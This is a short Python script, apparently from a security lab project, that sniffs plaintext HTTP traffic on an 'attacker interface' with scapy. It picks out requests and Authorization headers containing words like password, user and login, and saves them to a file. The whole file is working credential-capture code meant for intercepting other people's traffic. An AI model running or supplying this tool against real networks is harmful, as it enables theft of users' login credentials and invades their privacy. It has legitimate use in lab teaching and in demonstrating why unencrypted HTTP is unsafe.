#!/usr/bin/env python3
"""Sniff plaintext HTTP requests on the attacker interface."""

import os
import re
import sys
from datetime import datetime

from scapy.all import Raw, sniff
from scapy.layers.inet import TCP


KEYWORDS = ("password", "user", "login", "authorization")
OUTPUT_FILE = os.path.expanduser("~/project_output/captured_http.txt")


def interesting(payload):
    lower = payload.lower()
    return any(keyword in lower for keyword in KEYWORDS)


def handle_packet(pkt):
    if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
        return

    try:
        data = pkt[Raw].load.decode("utf-8", errors="ignore")
    except Exception:
        return

    if not (data.startswith("GET ") or data.startswith("POST ") or "Authorization:" in data):
        return

    if not interesting(data):
        return

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    match = re.search(r"^(GET|POST)\s+([^\s]+)\s+HTTP", data, flags=re.MULTILINE)
    request_line = match.group(0) if match else "HTTP request"
    record = f"[{ts}] {request_line}\n{data}\n{'-' * 72}\n"
    print(record)
    with open(OUTPUT_FILE, "a", encoding="utf-8") as handle:
        handle.write(record)


def main():
    if len(sys.argv) != 2:
        print("usage: python3 capture_credentials.py <attacker_interface>")
        sys.exit(1)

    iface = sys.argv[1]
    os.makedirs(os.path.dirname(OUTPUT_FILE), exist_ok=True)
    print(f"Sniffing HTTP on {iface}")
    print(f"Saving matched requests to {OUTPUT_FILE}")
    sniff(iface=iface, prn=handle_packet, store=False, filter="tcp port 80")


if __name__ == "__main__":
    main()
